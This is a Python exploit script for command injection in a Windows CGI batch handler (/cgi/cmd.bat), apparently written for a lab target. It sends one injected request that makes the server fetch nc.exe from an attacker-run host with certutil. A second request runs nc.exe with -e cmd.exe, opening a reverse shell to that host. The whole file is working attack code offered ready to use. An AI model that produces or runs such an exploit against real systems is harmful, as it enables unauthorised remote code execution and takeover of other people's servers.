
 

#!/usr/bin/env python3
import time
import requests
host='10.129.201.89'#add host to connect
port='8080'#add port of host {default:8080}
server_ip='10.10.15.69'#server that has nc.exe file to get reverse shell
server_port='8000'
nc_ip='10.10.15.69'
nc_port='1234'
url1 = host + ":" + str(port) + "/cgi/cmd.bat?" + "&&C%3a%5cWindows%5cSystem32%5ccertutil+-urlcache+-split+-f+http%3A%2F%2F" + server_ip + ":" + server_port + "%2Fnc%2Eexe+nc.exe"
url2 = host + ":" + str(port) + "/cgi/cmd.bat?&nc.exe+" + server_ip + "+" + nc_port + "+-e+cmd.exe"
try:
    requests.get("http://" + url1)
    time.sleep(2)
    requests.get("http://" + url2)
    print(url2)
except:
    print("Some error occured in the script")
